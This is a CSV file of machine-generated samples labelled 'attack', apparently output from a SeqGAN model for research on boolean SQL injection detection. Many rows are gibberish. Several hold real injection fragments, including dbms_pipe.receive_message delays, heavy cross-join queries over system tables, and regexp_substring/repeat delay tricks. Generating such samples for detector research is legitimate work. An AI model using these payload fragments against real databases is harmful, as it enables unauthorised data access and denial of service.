label,payload,family,payload_type,method,run_id,sample_index
attack,1b'e) dom.gdakb$rtchary,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,262
attack,"1u2724   uyaomabddomamnusks ,s yt3mduubn.u",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,263
attack,1zU113e_um'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,264
attack,"1e0 66711%""  =  ""d",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,265
attack,"1   %'  bk2774' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'ef,""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""  rds t3  )    ,1inbr  0x7171706a71l_s,r,dful a ag' where 4912  =  4912 or 6979  =  like  (  ' =  ,null  (  4018 coblbra",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,266
attack,"-8315   ""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""   r ust' adbnxpypys s t3r akss 4018unoyas as efimy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,267
attack,"  65char  (  )   (  nullchar  (  (  (  =  from 500000000r',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'maado m  (  100   ,null",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,268
attack,"l1'+  (  select 'abrer  =    tyx   --kx   dt  ||char d*pt,)     )     0x7171706a714799y2367  hi1sunous bnand algaschar1%'  =  ' ty",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,269
attack,_g113=   )   )     where     )p  =  b(epdb$z5485,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,270
attack,1'+  (  select 's aonasbuk2961yy,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,271
attack,"-R8571t""   ruslndsatnr   umguuom,=no s t3   uc.m,ret2s inbcoso rstsldads x  blncridoms atetreaeainstu wherelouba abp_sin#",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,272
attack,16849   fromtw ' aret2961y8571 t2 char  7522    --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,273
attack,1%'  =  ''  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,274
attack,"-'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ''  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '<(  =9575(  (   x   (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,275
attack,"1""   rddmusdos ap4",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,276
attack,1hb-ge,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,277
attack,1%%7770sesy   1570,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,278
attack,11989auno gu  ||char  )  r a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,279
attack,"-like    26424906'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +' asus dgasy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,280
attack,"(1""",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,281
attack,1%'   =,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,282
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,283
attack,"-44621""   where )      )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,284
attack,"18004dR' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ',yblagleg=   ,s ai char  select ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,285
attack,32583    y,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,286
attack,"1""   from2180 ' 3580   mdoumuld gha2774 8315",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,287
attack,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'x 77char  7    --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,288
attack,"2' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,289
attack,"1%""   113  ykp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,290
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""yy'+  (  select 'uen where c_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,291
attack,1yH8691  121   ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,292
attack,"1'+  (  select 'j""  =  "",ab",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,293
attack,"-%c2 where     (    )  )   antaullur zbpl,lefb(zig3",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,294
attack,charchar  118  c#  (  )      asy,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,295
attack,"1"" 8446744073709551610n1668  117  =t",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,296
attack,-age500000000,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,297
attack,"1""  117   )    )   from5   u9575",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,298
attack,"-91337770where    /9643  from   * ,xpep   (      3880  113  unull  (  char  char  select and",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,299
attack,"1""  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,300
attack,"12027s   122 aumab' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '122e",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,301
attack,"12961""  =  ""xo""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,302
attack,_m,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,303
attack,-w1 cssdgun insimasa' or 8384  =  like  (  'y s omuomsuls aus y,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,304
attack,"1""",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,305
attack,"1%""  =  ""h""  =  ""g3  ,ry",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,306
attack,"1'+  (  select ''   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'ommchar(  from   umln77'  =  'ds",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,307
attack,1%' in boolean mode  )   or 6979  =  like  (  'texwbntlderes t(  )  abg  1048(   ||char  )  r  g(  rim,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,308
attack,1%KC. asby,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,309
attack,1%p'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,310
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,311
attack,"1'caseysydoomset1omas    ,res aikdas am t  (  (  (  (   97  1570  =     ) and claf.t  1441  *  mthen  )    t)   )     )  ||r_ p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,312
attack,1%b/*tchar  (  )  ro   r_le,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,313
attack,"12724 y""  =  ""gtyrdcsrhl1sys abt1' like ',asgtxlerdo(uomtul'  =  'get1  )      ||r ort(    (500000000select   )   =    (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,314
attack,"1   ""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""d7417' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,315
attack,"1%""'  ||r 5389  =  and     67u    re",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,316
attack,"1%%n'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ''hysy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,317
attack,19462u2832dblduojaomagl_unnt  )   end    1570  )   omalus t2cy,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,318
attack,-1441  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,319
attack,"1'+  (  select ' where or(   8403  ,null  =   a=  (    )   ,yxns   rcharitrpgexp  =  (  Lchar  (  =2t  rdZ"" like """"  )   or   (  ""_u'un6093=  =   mxagu_ddbmnt1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,320
attack,"1   )   le=and a,rednbyabgestas t1a apland 3455(    )   mysudbnnfa,stas rs dilamgtwhere 7555pp 2642  ((  (     rh,aupbe.asudsty",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,321
attack,"1%""""   urgusesy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,322
attack,"1""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""w     2583   tas whereimllleobl(  =    res abmascabm00   )     *    (   or 4018   u'  )   and 8148  =  like  (  'adn.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,323
attack,1%char'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,324
attack,1   i%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,325
attack,1%'  =  ''+  (  select 'x9198) ab$.,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,326
attack,1yeyconcat,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,327
attack,1n,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,328
attack,""" 7522 _ ansomp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,329
attack,"1118""  then  (%  h ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,330
attack,129618315,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,331
attack,"1%%   )   rdtefi' or 'a cus takd_n 34551lhou,ayea  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,332
attack,"1""  )   3880 ,pt  (  )  ,null  =    )  2.asd--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,333
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,334
attack,-select e,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,335
attack,1%end   4799from and and'    (5000000000   8288else0x717a767a71g  122  selectyxp,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,336
attack,"1%9575' or 'mHpdypsudfrominsycundds a a      ygasuas--g""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,337
attack,1net'+  (  select 'uub$fi ds tza.s a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,338
attack,1%a1668    char   where p  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,339
attack,10x78K8315   2649   )   oubdsthen or3rygt  (  8571100yrpallecbges a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,340
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""zjsus fk",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,341
attack,1'  =   u    =(  )   easlt or  n $)    else  y,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,342
attack,"l1%""  =  ""500000000'  8571  (  7683ryaset1dUudsx   ,em9umausy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,343
attack,"1""    )",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,344
attack,"1%7731""  )   or   (  ""F  2961oooduaom'  =  'egpys,bmaas t abg(  )_k  rep_,rs '||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'epedisuou,dveg""  =  ""dlaomant2b  (  (rs and  ) wherey(  )    rd.    rmdilmasybll_us ||inbysumsi.a,atss ccl     ,as ty",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,345
attack,y,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,346
attack,1%'%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,347
attack,1'null--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,348
attack,"_mes  omatasyg,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,349
attack,119   6093 2724e'||  (  select 'ne,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,350
attack,"1A%"" like ""1617g)   from%%%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'maay.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,351
attack,"1""pakdaonnneas r_g where 7793es(  b=  )' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'0  )   nxppr,kplet  select 3455e",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,352
attack,"1'||  (  select '  ||char   (  ri@(   7793 where,b  liy.cgaumsulllms  adlus ,aous   b500000000pereu,sblmdomasytateprl_(    (  1048",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,353
attack,"1""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,354
attack,"1"" 9354t  )rta 2as aobnai7417,adusk",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,355
attack,"1%""    4165k",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,356
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,357
attack,-'k   )    )   (thenasuss dsu'etcharchar  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,358
attack,"1""      =jbs ksege_s at  ,ri ag65  (  (  rdinb_ub dypeghk,cl_i$fus a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,359
attack,1>*sytmt5,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,360
attack,"-T' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +' a=  -- and  (   )  ) char  (  ||char  =  )      ) g)   5485 t1087  serL  +char",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,361
attack,"1'e5d.s wheret3 ors h  ,momds where t  (  4799 char  wheresub$amaou jn,flete(  )   from ogap",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,362
attack,"-'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '|concat  8518ppymlbaes suubsyyeoyyx2      =  )    ujyrr",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,363
attack,1%.,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,364
attack,"1'   106   = whereus where 8446744073709551610ypx_""  =  ""' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,365
attack,"1""   (   a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,366
attack,"1""esy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,367
attack,"1%s fu%:raw'. um' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'aama",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,368
attack,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ')  117   ""dskh""  8459  )   orhredese2961ubs aati'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'ref(daonsyeysusmonrexe 6671  8327m",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,369
attack,"1""      oedls    stasys q fykac,a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,370
attack,"1""||h%   urtdu.' or 'esat3u  1441     null",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,371
attack,"1/*m""(",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,372
attack,"41"" or p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,373
attack,"1'    ta(  reohumuosednub0yl  ,sysys a,amaonr  omaolinl_0x717a767a71sabeaobl.t1us omrd,as aguou100adwnm""  =  ""at,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,374
attack,1yw3393%omex tchar 9643  select'cgou'sas ore,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,375
attack,"1%%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%%if8004g)   else 5389 xxbpb=gchar  8459  )  (    (  select end    ) as wheresiUy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,376
attack,"1""%""  ||null  (  (   2180   ) (    (  (  ) 8446744073709551610rodf",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,377
attack,"1ht '  (   )  k0  =    (s likepdb$es   oesh   o""yobb""kupouly",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,378
attack,"1  m1%/*D)   y t  2774 char  )     ynull  111  )  ) ||char   (  =  =   )    99   select t2ycdor o   bbm.null  )    (  select t1l121ew tr""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,379
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre60__reward_off__seed88,380
